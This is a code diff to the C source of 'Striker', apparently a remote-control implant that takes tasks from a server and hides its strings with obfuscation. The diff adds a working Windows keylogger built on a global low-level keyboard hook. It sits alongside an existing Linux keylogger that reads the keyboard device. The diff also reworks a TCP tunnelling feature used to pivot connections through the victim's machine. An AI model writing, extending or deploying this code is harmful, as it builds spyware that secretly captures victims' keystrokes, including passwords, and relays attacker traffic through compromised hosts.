@@ -14,7 +14,7 @@
 // #define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
-// #define STRIKER_DEBUG
+#define STRIKER_DEBUG
 
 // Size of agent UID
 #define AGENT_UID_SIZE 17
@@ -42,6 +42,12 @@ char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]";
 char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
 char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";
 
+// Some globals for the keylogger.
+static char keymon_active = 0;
+#ifdef IS_WINDOWS
+  static short *keymon_keystrokes = NULL;
+  static size_t keymon_keystrokes_count = 0;
+#endif
 
 char *obfs_decode(char *str){
 
@@ -401,16 +407,16 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
 
 void keymon(session *striker, task *tsk){
 
-  // TODO: Make 'tsk->uid' already initialized with the task ID.
+  keymon_active = 1;
+  cJSON *data = tsk->data;
   #ifdef IS_LINUX
     char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful", "[OBFS_ENC]main-kbd"};
     for (int i = 0; i < 8; i++)
       obfs_decode(strs[i]);
-    cJSON *data = tsk->data;
+    buffer *result_buff = create_buffer(0);
     unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
     unsigned char *keys = malloc(sizeof(unsigned char) * KEYMON_MAX_KEYSTROKES);
     size_t count = 0;
-    buffer *result_buff = create_buffer(0);
     int kb = open(strs[1], O_RDONLY);
     unsigned char main_kb_attached = 1;
     if (kb == -1){
@@ -487,10 +493,38 @@ void keymon(session *striker, task *tsk){
     free(keys);
     free_buffer(result_buff);
   #else
-    cJSON_AddItemToObject(tsk->result, "uid", cJSON_CreateString(tsk->uid));
-    cJSON_AddItemToObject(tsk->result, "result", cJSON_CreateString("Coming soon to windows..."));
+    char strs[][40] = {"[OBFS_ENC]duration", "[OBFS_ENC]Error creating hook thread!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]No keys logged!", "[OBFS_ENC]main-kbd"};
+    for (int i = 0; i < 6; i++)
+      obfs_decode(strs[i]);
+    unsigned long duration = (unsigned long)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
+    time_t end_time = time(NULL) + duration;
+    keymon_keystrokes = malloc(sizeof(short) * KEYMON_MAX_KEYSTROKES);
+    DWORD threadID;
+    HANDLE tHandle = CreateThread(NULL, 0, keymon_create_hook, NULL, 0, &threadID);
+    cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateString(tsk->uid));
+    if (!tHandle){
+      cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(strs[1]));
+    }else{
+      while (!(striker->abort || tsk->abort || keymon_keystrokes_count >= KEYMON_MAX_KEYSTROKES || time(NULL) >= end_time))
+        sleep(1);
+      printf("Killing keyboard hook...\n");
+      TerminateThread(tHandle, 0);
+      sleep(1);
+      if (keymon_keystrokes_count > 0){      
+        cJSON *keysArray = cJSON_CreateArray();
+        for (int i = 0; i < keymon_keystrokes_count; i++)
+          cJSON_AddItemToArray(keysArray, cJSON_CreateNumber(keymon_keystrokes[i]));
+        cJSON_AddItemToObject(tsk->result, strs[5], keysArray);
+      }else{
+        cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(strs[4]));
+      }
+    }
+    free(keymon_keystrokes);
+    keymon_keystrokes = NULL;
+    keymon_keystrokes_count = 0;
   #endif
   tsk->completed = 1;
+  keymon_active = 0;
 }
 
 #ifdef IS_LINUX
@@ -621,33 +655,87 @@ void keymon(session *striker, task *tsk){
       ptrace(PTRACE_DETACH, *pid, NULL, NULL);
       pthread_exit(NULL);
   }
+#else
+  DWORD WINAPI keymon_create_hook(LPVOID ptr){
+
+    printf("Creating hook...\n");
+    //Retrieve the applications instance
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+    //Set a global Windows Hook to capture keystrokes using the function declared above
+    HHOOK kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, keymon_hook_proc, hInstance, 0);
+    if (!kbHook){
+      printf("Failed to hook!\n");
+      return 0;
+    }
+    printf("Hook created!\n");
+    MSG Msg;
+    while (GetMessage(&Msg, NULL, 0, 0) > 0){
+      TranslateMessage(&Msg);
+      DispatchMessage(&Msg);
+    }
+    return 0;
+  }
+
+  LRESULT CALLBACK keymon_hook_proc(int nCode, WPARAM wParam, LPARAM lParam){
+
+    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
+    DWORD pressedKey = pKeyBoard->vkCode;
+    short isKeyup = wParam == WM_KEYUP;
+    if ((!isKeyup) || pressedKey == VK_RSHIFT || pressedKey == VK_LSHIFT || pressedKey == VK_SHIFT || pressedKey == VK_CAPITAL){
+      return CallNextHookEx(NULL, nCode, wParam, lParam);
+    }
+    short result = (short)pressedKey;
+    if (GetKeyState(VK_CAPITAL) & 0x1)
+      result = result ^ 0x8000;
+    if (GetKeyState(VK_LSHIFT) & 0x8000)
+      result = result ^ 0x4000;
+    if (GetKeyState(VK_RSHIFT) & 0x8000)
+      result = result ^ 0x4000;
+    if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES){    
+      printf("Caps: %d   Shift: %d   Val: %c\n", (result & 0x8000) != 0, (result & 0x4000) != 0, result & 0xff);
+      *(keymon_keystrokes + (sizeof(short) * keymon_keystrokes_count)) = 0;
+      keymon_keystrokes_count += 1;
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+  }
 #endif
 
 int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport){
 
+  char *lport_str = malloc(6), *rport_str = malloc(6);
+  snprintf(lport_str, 6, "%d", lport);
+  snprintf(rport_str, 6, "%d", rport);
   #ifdef IS_LINUX
     // Setup the socket server.
     int sock_fd, conn_fd;
-    struct sockaddr_in server_addr, client_addr;
+    struct addrinfo *server_addr, client_addr;
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock_fd == -1)
+    if (sock_fd == -1){
+      free(lport_str); free(rport_str);
       return 1;
-    bzero(&server_addr, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_addr.s_addr = inet_addr(lhost);
-    server_addr.sin_port = htons(lport);
-    if (bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)))
+    }
+    if (getaddrinfo(lhost, lport_str, NULL, &server_addr)){
+      free(lport_str); free(rport_str);
       return 1;
-    if (listen(sock_fd, 10))
+    }
+    if (bind(sock_fd, server_addr->ai_addr, server_addr->ai_addrlen)){
+      free(lport_str); free(rport_str);
+      freeaddrinfo(server_addr);
       return 1;
+    }
+    freeaddrinfo(server_addr);
+    if (listen(sock_fd, 10)){
+      free(lport_str); free(lport_str);
+      return 1;
+    }
     int client_addr_len = sizeof(client_addr);
     fd_set set;
     struct timeval timeout;
     pthread_t tid;
     // Main listener loop.
     while (!(striker->abort || tsk->abort)){
-      timeout.tv_sec = 0;
-      timeout.tv_usec = 1000000;
+      timeout.tv_sec = 1; // 1 sec timeout for accepting new conns
+      timeout.tv_usec = 0;
       FD_ZERO(&set);
       FD_SET(sock_fd, &set);
       int status = select(sock_fd + 1, &set, NULL, NULL, &timeout);
@@ -663,7 +751,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       queue_put(args, striker);
       queue_put(args, tsk);
       queue_put(args, rhost);
-      queue_put(args, &rport);
+      queue_put(args, rport_str);
       queue_put(args, &conn_fd);
       if (pthread_create(&tid, NULL, tcp_tunnel_route, (void *)args)){
         queue_free(args, 0);
@@ -671,11 +759,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       }
     }
     close(sock_fd);
-    return 0;
   #else
-    char *lport_str = malloc(6), *rport_str = malloc(6);
-    snprintf(lport_str, 6, "%d", lport);
-    snprintf(rport_str, 6, "%d", rport);
     // Setup winsocks
     WSADATA wsaData;
     int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
@@ -697,7 +781,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       return 1;
     }
     listen_sock = socket(socket_addr->ai_family, socket_addr->ai_socktype, socket_addr->ai_protocol);
-    if (listen_sock == INVALID_SOCKET) {
+    if (listen_sock == INVALID_SOCKET){
       freeaddrinfo(socket_addr);
       free(lport_str); free(rport_str);
       WSACleanup();
@@ -815,7 +899,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
             queue_seek(conns, conns->pos - 1);
             queue_free(sock_data, 0);
         }
-      Sleep(5); // A little delay
+      Sleep(10); // A little delay
     }
 
     // Cleanup
@@ -827,10 +911,11 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     queue_free(conns, 0);
     closesocket(listen_sock);
     free(client_sock); free(server_sock);
-    free(buffer); free(lport_str); free(rport_str);
+    free(buffer);
     WSACleanup();
-    return 0;
   #endif
+  free(lport_str); free(rport_str);
+  return 0;
 }
 
 #ifdef IS_LINUX
@@ -841,23 +926,28 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     session *striker = queue_get(args);
     task *tsk = queue_get(args);
     char *rhost = queue_get(args);
-    int rport = *((int *)queue_get(args));
+    char *rport = queue_get(args);
     int client_fd = *((int *)queue_get(args));
     queue_free(args, 0);
-    struct sockaddr_in server_addr;
     int server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd == -1)
       pthread_exit(NULL);
-    bzero(&server_addr, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_addr.s_addr = inet_addr(rhost);
-    server_addr.sin_port = htons(rport);
-    if (connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)))
+    struct addrinfo *server_addr;
+    if (getaddrinfo(rhost, rport, NULL, &server_addr))
       pthread_exit(NULL);
+    int block_size = 1024 * 50;
+    char *buffer = malloc(block_size);
+    int connected = 0;
+    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next){
+      if (connect(server_fd, addr_ptr->ai_addr, addr_ptr->ai_addrlen))
+        continue;
+      connected = 1;
+      break;
+    }
+    if (!connected)
+      goto end;
     fd_set client_set, server_set;
     struct timeval timeout;
-    int blockSize = 1024 * 50;
-    char *buffer = malloc(blockSize);
     int n = 0, status;
     while (!(striker->abort || tsk->abort)){
       timeout.tv_sec = 0;
@@ -868,7 +958,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       if (status == -1)
         break;
       if (status){
-        n = read(client_fd, buffer, blockSize);
+        n = read(client_fd, buffer, block_size);
         if (n == -1 || n == 0)
           break;
         write(server_fd, buffer, n);
@@ -881,16 +971,18 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       if (status == -1)
         break;
       if (status){
-        n = read(server_fd, buffer, blockSize);
+        n = read(server_fd, buffer, block_size);
         if (n == -1 || n == 0)
           break;
         write(client_fd, buffer, n);
       }
     }
-    close(server_fd);
-    close(client_fd);
-    free(buffer);
-    pthread_exit(NULL);
+    end:
+      freeaddrinfo(server_addr);
+      close(server_fd);
+      close(client_fd);
+      free(buffer);
+      pthread_exit(NULL);
   }
 #endif
 
@@ -1015,8 +1107,13 @@ DWORD WINAPI task_executor(LPVOID ptr)
     buffer_strcpy(result_buff, strs[1]);
     tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
-    keymon(striker, tsk);
-    tsk->successful = 1;
+    char msg[] = "[OBFS_ENC]keymon is already running!";
+    if (keymon_active){
+      buffer_strcpy(result_buff, obfs_decode(msg));
+    }else{
+      keymon(striker, tsk);
+      tsk->successful = 1;      
+    }
   }else if (!strcmp(tsk->type, cmd_strs[5])){ // Abort the session.
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1370,7 +1467,10 @@ void cleanup_session(session *striker){
 }
 
 int main(int argc, char **argv){
-  
+
+  #ifdef STRIKER_DEBUG
+    printf("[*] Starting Striker...\n");
+  #endif
   #ifdef IS_LINUX
     curl_global_init(CURL_GLOBAL_ALL);
     start_session();
@@ -1378,5 +1478,5 @@ int main(int argc, char **argv){
   #else
     start_session();
   #endif
-  return 0;  
+  return 0;
 }
